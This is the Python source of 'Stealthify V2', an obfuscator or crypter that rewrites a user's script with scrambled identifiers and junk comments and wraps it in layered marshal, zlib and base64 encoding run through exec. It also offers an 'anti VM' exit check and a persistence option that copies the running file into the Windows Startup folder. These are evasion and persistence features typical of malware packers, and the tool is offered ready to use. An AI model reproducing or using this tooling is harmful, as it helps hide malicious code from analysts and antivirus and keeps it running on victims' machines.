import ast, random, base64, os, marshal, zlib, sys
from colorama import Fore as f

os.system("cls")

class Obfuscator(ast.NodeTransformer):
    def __init__(self):
        self.mapping = {}
        self.function_parameters = {}

    def obfuscate_name(self, name):
        if name not in self.mapping:
            self.mapping[name] = "".join(random.choice(["I", "l"]) for _ in range(35))
        return self.mapping[name]

    def visit_FunctionDef(self, node):
        for arg in node.args.args:
            obfuscated_name = self.obfuscate_name(arg.arg)
            self.function_parameters[arg.arg] = obfuscated_name
            arg.arg = obfuscated_name
        return self.generic_visit(node)

    visit_AsyncFunctionDef = visit_FunctionDef

    def visit_Name(self, node):
        if isinstance(node.ctx, ast.Store):
            node.id = self.obfuscate_name(node.id)
        elif isinstance(node.ctx, ast.Load) and node.id in self.mapping:
            node.id = self.mapping[node.id]
        return node

    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id in self.function_parameters:
            node.func.id = self.function_parameters[node.func.id]

        if isinstance(node.func, ast.Attribute) and isinstance(node.func.value, ast.Name) and node.func.value.id in self.mapping:
            node.func.value.id = self.mapping[node.func.value.id]

        node.args = [self.visit(arg) if isinstance(arg, ast.Name) and arg.id in self.mapping else arg for arg in node.args]

        return self.generic_visit(node)

    def visit_Return(self, node):
        if isinstance(node.value, ast.Name) and node.value.id in self.mapping:
            node.value.id = self.mapping[node.value.id]
        return self.generic_visit(node)

    def visit_ExceptHandler(self, node):
        if node.name:
            obfuscated_name = self.obfuscate_name(node.name)
            self.mapping[node.name] = obfuscated_name
            node.name = obfuscated_name
        return self.generic_visit(node)

def obfuscate_code(code, iterations):
    tree = ast.parse(code)
    obfuscator = Obfuscator()
    for _ in range(iterations):
        obfuscator.visit(tree)
    obfuscated_code = ast.unparse(tree)
    return obfuscated_code

def Add_Dead_code(code):
    obfuscated_lines = code.split('\n')
    new_lines = []
    for line in obfuscated_lines:
        new_lines.append(line)
        dead_code_length = random.randint(2, 5)
        dead_code = '__STEALTHIFY_V2__' * dead_code_length
        new_lines.append(f"#{dead_code}")
    return '\n'.join(new_lines)

def Stealthcrypt(content):
    CMARK = '__STEALTHIFY__V2__' * 15
    COFFSET = 10
    marshaled_data = marshal.dumps(content.encode())
    compressed_data = zlib.compress(marshaled_data)
    encoded_data = base64.b85encode(compressed_data).decode()
    b64_encoded_data = base64.b64encode(encoded_data.encode()).decode()
    code = f'{CMARK} = ""\n'
    for i in range(0, len(b64_encoded_data), COFFSET):
        chunk = b64_encoded_data[i:i+COFFSET]
        code += f'{CMARK} += "{chunk}"\n'
    code += f"exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b85decode(__import__('base64').b64decode({CMARK}.encode()).decode()))))"
    return code

try:
    print(f.RED + """
███████╗████████╗███████╗ █████╗ ██╗  ████████╗██╗  ██╗██╗███████╗██╗   ██╗    ██╗   ██╗██████╗ 
██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║  ╚══██╔══╝██║  ██║██║██╔════╝╚██╗ ██╔╝    ██║   ██║╚════██╗
███████╗   ██║   █████╗  ███████║██║     ██║   ███████║██║█████╗   ╚████╔╝     ██║   ██║ █████╔╝
╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██║   ██╔══██║██║██╔══╝    ╚██╔╝      ╚██╗ ██╔╝██╔═══╝ 
███████║   ██║   ███████╗██║  ██║███████╗██║   ██║  ██║██║██║        ██║        ╚████╔╝ ███████╗
╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝╚═╝        ╚═╝         ╚═══╝  ╚══════╝
- By Sirmilann [SR] - https://discord.gg/Eww5ucwY4a
""")
    file_path = input(f.RED + "File: ")
    iterations = int(input(f.RED + "Number of Obfuscation Layers: "))
    antivm = input(f.RED + "Enable Anti VM? [yes/no]: ")  
    add_junk = input("Add Dead Code? [yes/no]: ")
    startup = input("Use Startup? [yes/no]: ")
    use_Stealthcrypt = input(f.RED + "Use Encoding And Encryption? [yes/no]: ")

    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            code = file.read()
    except FileNotFoundError:
        print(f.RED + "File not found. Please provide a valid file path.")
        sys.exit(1)
    
    obfuscated_code = obfuscate_code(code, iterations)
    
    if antivm.lower() == 'yes':
        obfuscated_code += """
import sys
def get_base_prefix_compat():
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix
def in_virtualenv(): 
    return get_base_prefix_compat() != sys.prefix
if in_virtualenv() == True:
    sys.exit()
"""

    if startup.lower() == 'yes':
        obfuscated_code += """
import sys,os,shutil
currentfile = sys.argv[0]
folder_path = os.path.join(os.environ['APPDATA'],'Microsoft','Windows','Start Menu','Programs','Startup')
shutil.copy(currentfile,folder_path)
"""
    
    if add_junk.lower() == 'yes':
        obfuscated_code = Add_Dead_code(obfuscated_code)
    
    if use_Stealthcrypt.lower() == 'yes':
        obfuscated_code = Stealthcrypt(obfuscated_code)
  
    file_name = file_path.rsplit('.', 1)[0]
    extension = file_path.rsplit('.', 1)[1]
    obfuscated_file_path = file_name + "_obf." + extension
    
    try:
        with open(obfuscated_file_path, 'w', encoding='utf-8') as file:
            file.write("# Obfuscated With Stealthify V2 By Sirmilann\n" + obfuscated_code)
        print(f.RED + "Code Saved To:", obfuscated_file_path)
    except IOError as e:
        print(f.RED + "Error saving the obfuscated code:", str(e))
    except Exception as e:
        print(f.RED + "An unexpected error occurred while saving the obfuscated code:", str(e))
except ValueError:
    print(f.RED + "Invalid input. Please enter a valid number of obfuscation layers.")
except Exception as e:
    print(f.RED + "An unexpected error occurred:", str(e))
input()
